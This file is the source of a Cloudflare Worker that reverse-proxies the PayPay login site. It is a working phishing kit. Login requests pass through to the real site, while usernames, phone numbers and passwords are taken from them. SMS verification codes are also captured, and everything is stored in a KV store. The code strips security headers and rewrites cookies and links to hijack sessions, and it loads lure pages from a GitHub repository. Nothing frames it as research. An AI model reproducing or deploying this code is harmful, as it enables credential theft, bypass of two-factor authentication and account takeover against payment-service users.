// Cloudflare Worker — reverse proxy to PayPay + credential store
// KV binding: CREDS
// /admin, /{16文字ID}, /sms.html → 静的ページを配信
// /signin.html → 本物の PayPay ログインにリバースプロキシ（キャプチャ付き）

const TARGET_ORIGIN = "https://www.paypay.ne.jp";
const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
const LINK_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/link.html";
const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/sms.html";
const SIGNUP_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signup.html";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    if (url.pathname === "/" || url.pathname === "") {
      return Response.redirect(url.origin + "/admin", 302);
    }

    if (url.pathname === "/admin" || url.pathname === "/admin.html") {
      return fetchStatic(ADMIN_SOURCE);
    }

    if (url.pathname === "/link.html" || url.pathname === "/link") {
      return fetchStatic(LINK_SOURCE);
    }

    if (url.pathname === "/sms.html" || url.pathname === "/sms") {
      return fetchStatic(SMS_SOURCE);
    }

    if (url.pathname === "/signup.html" || url.pathname === "/signup") {
      return fetchStatic(SIGNUP_SOURCE);
    }

    if (url.pathname === "/api/sms_confirm" && request.method === "POST") {
      return handleSmsConfirm(request, env);
    }

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    const pathParts = url.pathname.split("/").filter(Boolean);
    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
      return fetchStatic(LINK_SOURCE);
    }

    if (url.pathname === "/signin.html" || url.pathname === "/signin" || url.pathname.includes("/sign-in") || url.pathname.includes("/oauth")) {
      return proxyWithCapture(request, env, workerHost);
    }

    return proxyWithCapture(request, env, workerHost);
  },
};

async function proxyWithCapture(request, env, workerHost) {
  const url = new URL(request.url);
  let targetPath = url.pathname;

  if (url.pathname === "/signin.html" || url.pathname === "/signin") {
    targetPath = "/app/account/logout";
    url.search = "?redirect=%2Fapp%2Faccount%2Fsign-in";
  }

  const targetUrl = TARGET_ORIGIN + targetPath + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  let body = request.body;

  if ((request.method === "POST" || request.method === "PUT") && (url.pathname.includes("/oauth") || url.pathname.includes("/sign-in") || url.pathname.includes("/password"))) {
    const clone = request.clone();
    try {
      const text = await clone.text();
      body = text;

      let parsed = {};
      try { parsed = JSON.parse(text); } catch {
        const params = new URLSearchParams(text);
        for (const [k, v] of params) parsed[k] = v;
      }

      if (parsed.username || parsed.phone || parsed.password) {
        const captured = {
          type: "captured_login",
          path: url.pathname,
          username: parsed.username || parsed.phone || null,
          password: parsed.password || null,
          raw: text.slice(0, 1500),
          ts: new Date().toISOString(),
          ua: request.headers.get("User-Agent") || "",
        };
        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
        await env.CREDS.put(key, JSON.stringify(captured));
      }
    } catch {}
  }

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
    redirect: "follow",
  });

  const newHeaders = new Headers(res.headers);
  newHeaders.delete("content-security-policy");
  newHeaders.delete("x-frame-options");

  const setCookies = newHeaders.getAll("set-cookie") || [];
  newHeaders.delete("set-cookie");
  for (const c of setCookies) {
    const rewritten = c
      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
    newHeaders.append("set-cookie", rewritten);
  }

  const contentType = newHeaders.get("content-type") || "";
  if (contentType.includes("text/html") || contentType.includes("javascript")) {
    let text = await res.text();
    text = text.replace(/https?:\/\/www\.paypay\.ne\.jp/g, `https://${workerHost}`);
    return new Response(text, { status: res.status, headers: newHeaders });
  }

  return new Response(res.body, { status: res.status, headers: newHeaders });
}

async function handleSmsConfirm(request, env) {
  let body = {};
  try { body = await request.json(); } catch {}
  const captured = {
    type: "sms_confirm",
    code: body.code || null,
    ts: new Date().toISOString(),
  };
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(captured));
  return json({ status: "ok" });
}

async function fetchStatic(source) {
  try {
    const res = await fetch(source);
    if (res.ok) {
      return new Response(await res.text(), {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }
  } catch {}
  return new Response("Fetch failed", { status: 502 });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
